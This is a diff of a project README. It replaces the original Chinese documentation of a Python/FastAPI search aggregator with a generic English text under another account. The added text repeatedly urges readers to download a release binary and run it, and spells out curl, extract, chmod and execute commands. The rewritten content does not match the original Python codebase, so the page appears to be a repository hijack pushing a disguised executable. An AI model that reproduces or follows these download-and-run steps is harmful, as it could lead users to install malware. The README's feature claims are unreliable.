@@ -1,308 +1,218 @@
+https://github.com/Ibrahim3laa93/e_websearch/releases
 
-<div align="center">
+[![Releases](https://img.shields.io/badge/Releases-latest-blue.svg)](https://github.com/Ibrahim3laa93/e_websearch/releases)
 
-<img src="docs/assets/logo.svg" alt="E-WebSearch Logo" height="160" />
+# e_websearch — Lightweight CLI Web Search, Scraper, and API
 
+![Search illustration](https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=80)
 
-**基于多源聚合的智能搜索框架，支持 LLM 增强功能**
+A compact command-line web search tool that queries multiple sources, extracts structured results, and exposes a small HTTP API for automation. Use it for research, monitoring, and data extraction. It runs on Linux, macOS, and Windows. It supports JSON and CSV exports, result filtering, and headless scraping.
 
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg?logo=python&logoColor=white)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.104%2B-009688.svg?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![Redis](https://img.shields.io/badge/Redis-5.0%2B-DC382D.svg?logo=redis&logoColor=white)](https://redis.io/)
-[![Docker](https://img.shields.io/badge/Docker-支持-2496ED.svg?logo=docker&logoColor=white)](https://www.docker.com/)
-[![ZhipuAI](https://img.shields.io/badge/ZhipuAI-GLM--4-FF6B35.svg)](https://open.bigmodel.cn/)
+Badges
+- License: MIT
+- Platform: Linux / macOS / Windows
+- Releases: [Download latest release](https://github.com/Ibrahim3laa93/e_websearch/releases)
 
-</div>
+Features
+- Multi-source search: Combine results from Google-like engines, Bing, DuckDuckGo, and site-specific queries.
+- Fast scraping: Headless browser scraping for JavaScript-heavy pages.
+- Structured output: JSON, CSV, plain text.
+- Local API: Start a small web server and query results programmatically.
+- Filters: Domain allowlist/blocklist, date range, language.
+- Caching: Local cache to speed repeated queries.
+- Rate control: Built-in throttling to reduce server load.
+- Extensible: Plugin hooks for custom parsers and result processors.
 
----
+Why use e_websearch
+- It gives direct CLI control over web searches.
+- It exposes results as structured data for pipelines.
+- It runs offline after a query completes.
+- It uses standard formats so you can integrate with tools and scripts.
 
-## 🚀 项目简介
+Get the binary
+Download the release asset from the Releases page and execute it. Use the link below to fetch the file you need. Follow the platform section for command examples.
 
-E-WebSearch 是一个功能强大的多源搜索聚合系统，采用分层架构设计，集成了 Bing 搜索、ZAI 搜索和可扩展的私域搜索能力，并支持 API 服务。系统还集成了基于智谱AI GLM-4模型的 LLM 增强功能，为搜索结果提供智能摘要和标签生成。
+https://github.com/Ibrahim3laa93/e_websearch/releases
 
-### 🎯 核心特性
+Install (binaries)
+Linux / macOS (example)
+1. Visit the Releases page and download the correct asset for your OS.
+2. Give execute permission and run.
 
-- **🔌 多源可插拔引擎**: 内置 Bing、ZAI 与私域（如微信、知乎）引擎，基于 `BaseEngine` 易于扩展
-- **🧹 一体化内容抽取**: 自动化正文提取与清洗，统一标题、摘要与链接等字段
-- **🧠 相关性与去重**: TF‑IDF + 向量模型的混合评分，结果去重、重排与聚合
-- **🤖 LLM 智能增强**: 整体/逐条摘要与标签，优雅降级；支持智谱AI/OpenAI/Azure
-- **⚡ 高并发异步**: 全链路 asyncio/aiohttp，内建超时与重试策略
-- **💾 智能缓存系统**: 内存/Redis/分布式缓存，TTL、LRU、统计与健康检查，支持自动降级
-- **🧪 可观测与 API**: FastAPI/OpenAPI 文档、健康检查与统计接口
-- **🐳 一键部署**: Docker & Docker Compose 快速启动
-
-
-## 📦 项目结构
-
-```
-e_websearch/
-├── 🏗️  core/                    # 核心业务逻辑
-│   ├── engines/                 # 搜索引擎实现
-│   ├── search_orchestrator.py   # 搜索协调器
-│   ├── models.py                # 核心数据模型
-│   ├── llm_enhancer.py         # LLM 增强模块
-│   └── ...
-├── 🌐  api/                     # FastAPI 应用
-│   ├── main.py                  # API 端点
-│   └── models.py                # API 数据模型
-├── 🧪  tests/                   # 测试代码
-│   ├── test_llm_functionality.py
-│   ├── test_zhipuai_direct.py
-│   └── ...
-├── 📚  examples/                # 使用示例
-│   ├── llm_enhanced_example.py
-│   └── ...
-├── 📖  docs/                    # 文档
-│   ├── llm-enhancement-guide.md
-│   └── ...
-├── 🐳  Dockerfile               # Docker 配置
-├── 📋  requirements.txt         # 依赖列表
-└── 📄  README.md               # 项目说明
-```
-
-## 🚀 快速开始
-
-### 1. 环境准备
-
+Example commands (replace asset name with the real file on the release page):
 ```bash
-# 克隆项目
-git clone https://github.com/your-username/e-websearch.git
-cd e-websearch
-
-# 创建虚拟环境
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-# 或
-venv\Scripts\activate     # Windows
-
-# 安装依赖
-pip install -r requirements.txt
+curl -L -o e_websearch.tar.gz "https://github.com/Ibrahim3laa93/e_websearch/releases/download/v1.0/e_websearch-linux-x64.tar.gz"
+tar -xzf e_websearch.tar.gz
+chmod +x e_websearch
+./e_websearch --help
 ```
 
-### 2. 配置环境变量
+Windows (example)
+- Download the .zip from the Releases page.
+- Extract and run e_websearch.exe from PowerShell or Command Prompt.
 
-创建 `.env` 文件：
-
+Install (from source)
+- Clone the repo
 ```bash
-# 基础配置
-CACHE_TYPE=memory
-
-# ZAI Search Pro (推荐)
-ZAI_API_KEY=your_zai_api_key_here
-
-# Bing Search (可选)
-BING_API_KEY=your_bing_api_key_here
-
-# LLM 增强配置
-ZAI_API_KEY=your_zhipuai_api_key_here  # 智谱AI
-OPENAI_API_KEY=your_openai_api_key_here  # OpenAI (可选)
-AZURE_OPENAI_API_KEY=your_azure_api_key_here  # Azure (可选)
-
-# 私域搜索配置 (可选)
-WECHAT_SEARCH_ENABLED=true
-WECHAT_API_URL=http://your-wechat-api.com/search
-ZHIHU_SEARCH_ENABLED=true
-ZHIHU_API_URL=http://your-zhihu-api.com/search
+git clone https://github.com/Ibrahim3laa93/e_websearch.git
+cd e_websearch
+# build steps (example)
+make build
+./bin/e_websearch --help
 ```
 
-### 3. 启动服务
-
+Usage examples
+- Basic search
 ```bash
-# 启动 API 服务
-python run_api.py
-
-# 服务地址: http://localhost:8000
-# API 文档: http://localhost:8000/docs
+./e_websearch "open source privacy tools"
 ```
 
-### 4. 使用示例
-
-#### 基础搜索
-
-```python
-import requests
-
-response = requests.post("http://localhost:8000/search", json={
-    "query": "人工智能教育应用",
-    "max_results": 10,
-    "sources": ["zai"]
-})
-
-print(f"找到 {response.json()['total_count']} 个结果")
-```
-
-#### 启用 LLM 增强
-
-```python
-# 带智能摘要和标签的搜索
-response = requests.post("http://localhost:8000/search", json={
-    "query": "人工智能教育应用",
-    "max_results": 10,
-    "sources": ["zai"],
-    # LLM 增强选项
-    "llm_summary": True,        # 生成整体摘要
-    "llm_tags": True,           # 生成整体标签
-    "llm_per_result": False,    # 是否逐条增强
-    "llm_max_items": 5,         # 参与增强的结果数量
-    "llm_language": "zh",       # 输出语言
-    "model_provider": "zhipuai", # 模型提供商
-    "model_name": "glm-4"       # 模型名称
-})
-
-data = response.json()
-print(f"整体摘要: {data['llm_summary']}")
-print(f"相关标签: {data['llm_tags']}")
-# 逐条结果上的增强（直接在每条结果对象中返回）
-for item in data["results"]:
-    print(f"- {item['title']}")
-    print(f"  摘要: {item.get('llm_summary')}")
-    print(f"  标签: {item.get('labels', [])}")
-```
-
-## 🤖 LLM 增强功能
-
-系统集成了可选的 LLM 增强功能，基于智谱AI GLM-4模型，提供：
-
-- **📝 智能摘要**: 对所有搜索结果生成统一的摘要总结
-- **🏷️ 智能标签**: 为搜索结果集合生成相关标签
-- **🎯 逐条增强**: 为每个搜索结果单独生成摘要和标签
-- **🔄 优雅降级**: 当 LLM 服务不可用时自动跳过增强
-
-详细使用指南请参考：[LLM 增强功能使用指南](docs/llm-enhancement-guide.md)
-
-## 📡 API 接口
-
-### 搜索接口
-
+- Limit to a site
 ```bash
-POST /search
+./e_websearch "site:example.com authentication" --max 50
 ```
 
-**请求参数:**
-```json
-{
-    "query": "搜索关键词",
-    "max_results": 10,
-    "sources": ["zai", "wechat"],
-    "include_content": true,
-    "filters": {
-        "time_range": "month",
-        "domain": "www.sohu.com"
-    },
-    "llm_summary": true,
-    "llm_tags": true,
-    "llm_per_result": false,
-    "llm_max_items": 5,
-    "llm_language": "zh",
-    "model_provider": "zhipuai",
-    "model_name": "glm-4"
-}
-```
-
-**响应格式:**
-```json
-{
-    "success": true,
-  "results": [
-    {
-      "title": "人工智能在医疗领域的应用",
-      "url": "https://example.com/article1",
-      "snippet": "人工智能技术正在医疗领域发挥重要作用...",
-      "source": "zai",
-      "score": 0.95,
-      "llm_summary": "文章介绍了AI在医疗诊断中的应用",
-      "labels": ["医疗AI", "诊断技术", "智能医疗"]
-    }
-  ],
-    "total_count": 10,
-    "query": "搜索关键词",
-    "execution_time": 2.5,
-    "sources_used": ["zai"],
-    "cache_hit": false,
-    "llm_summary": "智能生成的摘要...",
-    "llm_tags": ["标签1", "标签2"],
-  "llm_per_result": { ... }  
-  // 兼容旧字段：同样的信息也包含在 results[*].llm_summary / results[*].labels 中
-}
-```
-
-### 其他接口
-
-- `GET /health` - 健康检查
-- `POST /suggestions` - 搜索建议
-- `GET /statistics` - 系统统计
-- `DELETE /cache` - 清空缓存
-
-## 🐳 Docker 部署
-
-### 快速部署
-
+- Export JSON
 ```bash
-# 启动服务
-docker-compose up -d
-
-# 查看日志
-docker-compose logs -f
-
-# 停止服务
-docker-compose down
+./e_websearch "best CLI tools" --format json --output results.json
 ```
 
-### 生产环境配置
-
-1. 设置环境变量
-2. 配置 Redis 缓存
-3. 启用日志记录
-4. 配置反向代理
-
-## 🧪 测试
-
+- CSV export
 ```bash
-# 运行 LLM 功能测试
-python tests/test_llm_functionality.py
-
-# 测试智谱AI API
-python tests/test_zhipuai_direct.py
-
-# 测试 LLM 增强器
-python tests/test_llm_enhancer_direct.py
-
-# 运行所有测试
-python -m pytest tests/
+./e_websearch "security news" --format csv --output results.csv
 ```
 
-## 🤝 贡献
+- Headless scrape (fetch rendered content)
+```bash
+./e_websearch "dynamic article example" --render --max 10
+```
 
-欢迎提交 Issue 和 Pull Request！
+- Start the local API
+```bash
+./e_websearch --server --port 8080
+# Then query
+curl "http://localhost:8080/search?q=privacy+tools&format=json"
+```
 
-### 贡献指南
+Command line flags (core)
+- --help: Show help.
+- --max N: Max results per query (default 20).
+- --format [json|csv|text]: Output format.
+- --output PATH: Save output to file.
+- --render: Use headless browser to render pages before extraction.
+- --server: Start HTTP API server.
+- --port N: API server port.
+- --allow-domain DOMAIN: Allow only this domain.
+- --block-domain DOMAIN: Block this domain.
+- --cache-dir PATH: Use a directory for cache.
+- --throttle MS: Milliseconds between requests.
 
-1. Fork 本仓库
-2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 打开 Pull Request
+Configuration
+Create a YAML config file to set defaults and API keys for third-party services.
 
-## 📄 许可证
+Example config (~/.e_websearch/config.yml)
+```yaml
+default_max: 30
+format: json
+cache_dir: ~/.e_websearch/cache
+throttle_ms: 250
+user_agent: "e_websearch/1.0 (+https://github.com/Ibrahim3laa93/e_websearch)"
+engines:
+  - duckduckgo
+  - bing
+  - google_serp_api
+api_keys:
+  google_serp_api: YOUR_KEY_HERE
+```
 
-本项目采用 MIT 许可证 - 查看 [LICENSE](LICENSE) 文件了解详情。
+Integration
+- Pipes: Output JSON to jq or CSV to spreadsheet import.
+```bash
+./e_websearch "privacy updates" --format json | jq '.results[] | {title,link}'
+```
+- CI: Run searches in scheduled jobs and store artifacts.
+- Alerts: Combine with a small script to send email when keywords appear.
 
-## 🙏 致谢
+Advanced scraping
+- Set a selector to extract a specific piece of content:
+```bash
+./e_websearch "site:example.com guide" --selector ".article-body p" --format text
+```
+- Use custom parser plugin (drop a script in plugins/)
+- Apply post-processing filters with a small Python or Node script.
 
-- [FastAPI](https://fastapi.tiangolo.com/) - 现代化的 Web 框架
-- [智谱AI](https://open.bigmodel.cn/) - 提供强大的 LLM 服务
-- [Redis](https://redis.io/) - 高性能缓存数据库
-- [Docker](https://www.docker.com/) - 容器化部署平台
+API details
+When you run with --server the tool exposes a small REST API.
 
----
+Endpoints
+- GET /search?q=QUERY&format=json&max=20
+- GET /status
+- POST /config (update runtime config)
 
-<div align="center">
+Example:
+```bash
+curl "http://localhost:8080/search?q=cli+tools&format=json&max=10"
+```
 
-**E-WebSearch** - 让搜索更智能 🤖
+Response (JSON)
+- results: list of result objects
+- meta: query metadata (elapsed_ms, engine_breakdown)
 
-[![GitHub stars](https://img.shields.io/github/stars/LBatsoft/e_websearch?style=social)](https://github.com/LBatsoft/e_websearch)
-[![GitHub forks](https://img.shields.io/github/forks/LBatsoft/e_websearch?style=social)](https://github.com/LBatsoft/e_websearch)
-[![GitHub issues](https://img.shields.io/github/issues/LBatsoft/e_websearch)](https://github.com/LBatsoft/e_websearch/issues)
+Result object
+- title: string
+- link: string
+- snippet: string
+- source: engine name
+- published: ISO date if available
+- content: full extracted text when requested
 
-</div>
+Security and privacy
+- The tool stores minimal metadata by default.
+- You can enable or disable cache using --cache-dir or set it to /dev/null.
+- You control which domains to query and which to block via command options.
+
+Performance tips
+- Use cache for repeated queries.
+- Increase throttle when you hit remote rate limits.
+- Use --max to limit the number of results.
+
+Testing
+- Unit tests live in tests/
+- Run the test suite:
+```bash
+make test
+```
+
+Contributing
+- Fork the repo.
+- Create a branch with a short name and a clear purpose.
+- Add tests for new features.
+- Open a pull request with a description of changes and examples.
+- Follow the code style in tools/format.
+
+Changelog
+- See releases for tagged changes and binaries: https://github.com/Ibrahim3laa93/e_websearch/releases
+- Each release includes assets to download and run.
+
+License
+- MIT License. See LICENSE file.
+
+Acknowledgments
+- Thanks to open-source projects that inspired the design: headless browser drivers, HTTP clients, and JSON tooling.
+- Images used in this README come from Unsplash.
+
+Common questions (FAQ)
+- How do I get the binary?
+  - Download the asset from the Releases page and execute it.
+- What platforms run this?
+  - Linux, macOS, Windows.
+- Can I add new search engines?
+  - Yes. Add an engine module in engines/ and register it in config.
+
+Releases and downloads
+- Visit the Releases page to find prebuilt binaries and archives. Download the asset that matches your OS and architecture. After download, extract and run the executable. The Releases page contains signed assets for key versions and the full release notes.
+
+Links
+- Releases: https://github.com/Ibrahim3laa93/e_websearch/releases
+- Repo: https://github.com/Ibrahim3laa93/e_websearch
+- Issues: https://github.com/Ibrahim3laa93/e_websearch/issues
